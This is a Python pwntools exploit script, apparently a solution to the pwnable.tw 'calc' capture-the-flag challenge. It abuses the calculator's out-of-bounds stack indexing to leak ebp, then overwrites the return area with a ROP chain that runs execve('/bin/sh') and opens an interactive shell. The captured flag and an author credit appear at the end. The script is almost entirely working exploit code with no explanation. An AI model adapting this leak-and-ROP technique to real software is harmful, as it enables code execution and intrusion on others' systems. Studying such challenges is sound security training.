from pwn import *
context(os='linux',arch='i386',log_level='debug')
#io = remote("chall.pwnable.tw",10100)
io = process('./calc')

# /bin/sh and gadget
a = int('/bin'[::-1].encode("hex"),16)
b = int('/sh'[::-1].encode("hex"),16)
pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
int_80 = 0x08049a21

# leak ebp
io.recv()
io.sendline("+360")
ebp = int(io.recv())-0x20
binsh_addr = ebp+8*4

# attack
ROP_chain = [pop_eax,11,pop_edx_ecx_ebx,0,0,binsh_addr,int_80,a,b]
for i in range(361,370):
	num = i - 361
	io.sendline("+"+str(i))
	tmp = int(io.recvline())
	if tmp<ROP_chain[num]:
		io.sendline("+"+str(i)+"+"+str(ROP_chain[num]-tmp))
	else:
		io.sendline("+"+str(i)+"-"+str(tmp-ROP_chain[num]))
	io.recvline()

io.sendline()
io.interactive()

#FLAG{C:\Windows\System32\calc.exe}
#pwned by Ld1ng